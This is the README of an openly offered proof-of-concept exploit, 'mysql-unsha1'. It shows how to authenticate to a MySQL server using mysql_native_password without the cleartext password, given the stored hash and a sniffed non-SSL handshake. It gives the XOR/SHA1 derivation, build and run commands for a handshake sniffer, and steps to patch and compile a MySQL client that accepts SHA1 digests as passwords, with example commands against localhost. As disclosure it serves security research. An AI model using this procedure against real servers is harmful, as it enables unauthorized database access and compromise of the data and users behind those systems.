mysql-unsha1
============

Authenticate against a MySQL server without knowing the cleartext password.

Abstract
--------

This PoC shows how it is possible to authenticate against a MySQL server under
certain circumstances without knowing the cleartext password when the [Secure
Password Authentication] authentication plugin (aka `mysql_native_password`) is
used.

The main prerequisites are:

- to know the hashed password for a certain user (`password` column of the
  `mysql.user` table);

- to be able to sniff a successful authentication handshake (i.e., no SSL).

MySQL server passwords
----------------------

By default, passwords are stored in the `mysql.user` table and are hashed using
the `PASSWORD` function which is just a two-stage SHA1 digest:

```
> SELECT user, password FROM mysql.user;
+------------------+-------------------------------------------+
| user             | password                                  |
+------------------+-------------------------------------------+
| root             | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |
+------------------+-------------------------------------------+

> SELECT PASSWORD('password');
+-------------------------------------------+
| PASSWORD('password')                      |
+-------------------------------------------+
| *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |
+-------------------------------------------+

> SELECT SHA1(UNHEX(SHA1('password')));
+------------------------------------------+
| SHA1(UNHEX(SHA1('password')))            |
+------------------------------------------+
| 2470c0c06dee42fd1618bb99005adca2ec9d1e19 |
+------------------------------------------+
```

The handshake
-------------

After the TCP connection phase, initiated by the client, the MySQL
authentication [handshake] continues as follows (simplified):

1. the server sends a `Server Greeting` packet containing a *salt* (`s`);

2. the client replies with a `Login Request` packet containing the session
   password (`x`), computed as follows:

        x := SHA1(password) XOR SHA1(s + SHA1(SHA1(password)))

    where `password` is the cleartext password as provided by the user and `+`
    is a mere string concatenation operator.

3. the server can verify the *challenge* and authenticate the client if:

        SHA1(x XOR SHA1(s + SHA1(SHA1(password)))) = SHA1(SHA1(password))

The exploit
-----------

With enough information an attacker is able to obtain `SHA1(password)` and
therefore to solve the server challenge without the knowledge of the cleartext
password.

Let:

- `h` be the hashed password obtained from the `mysql.user` table (i.e.,
  `SHA1(SHA1(password))`);

- `s` and `x` be the salt and the session password respectively obtained from
   the sniffed handshake.

The first-stage SHA1 can be obtained as follows:

    SHA1(password) = x XOR SHA1(s + h)

Tools
-----

To ease the reproducibility of this exploit this PoC provides two tools:

- a simple sniffer to extract and check the handshake information either live or
  offline from a PCAP file;

- a patch for MySQL client which allows to treat the prompted passwords as SHA1
  digests instead of cleartext.

### Build the sniffer

To produce `mysql-unsha1-sniff` just run `make` (or `make static` to produce a
statically linked executable). The Makefile will look for the `uthash.h` file in
this directory and will download it if not found.

Run `mysql-unsha1-sniff` without arguments to show the usage message.

According to the previous example:

    sudo ./mysql-unsha1-sniff -i lo 127.0.0.1 3306 2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19:root

If no account information is provided the tool will only display the salt and
the session password.

### Build a patched MySQL client

This may take some time:

1. download and extract the MySQL source code:

        wget https://github.com/mysql/mysql-server/archive/23032807537d8dd8ee4ec1c4d40f0633cd4e12f9.zip
        unzip 23032807537d8dd8ee4ec1c4d40f0633cd4e12f9.zip
        cd mysql-server-23032807537d8dd8ee4ec1c4d40f0633cd4e12f9/

2. apply the patch:

        patch -p1 </path/to/mysql-server-unsha1.patch

3. build the client only with:

        mkdir build
        cd build
        cmake -DDOWNLOAD_BOOST=1 -DWITH_BOOST=boost -DWITHOUT_SERVER:BOOL=ON ..
        make -j$(nproc)

4. the client executable will be in `client/mysql`, optionally install it
   globally and delete the whole source code:

        sudo cp client/mysql /usr/local/bin/mysql-unsha1

Use `mysql-unsha1` as the regular MySQL client, just remeber that the
`--password[=password], -p[password]` option now reuqires a 40-digit hexadecimal
SHA1 string. According to the previous example:

    mysql-unsha1 -h 127.0.0.1 -P 3306 -u root --password=5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8

Where:

```
> SELECT SHA1(UNHEX('5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8'));
+---------------------------------------------------------+
| SHA1(UNHEX('5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8')) |
+---------------------------------------------------------+
| 2470c0c06dee42fd1618bb99005adca2ec9d1e19                |
+---------------------------------------------------------+
```

and `2470c0c06dee42fd1618bb99005adca2ec9d1e19` is the hashed password stored in
the `mysql.user` table.

[Secure Password Authentication]: https://dev.mysql.com/doc/internals/en/secure-password-authentication.html
[handshake]: https://dev.mysql.com/doc/internals/en/plain-handshake.html
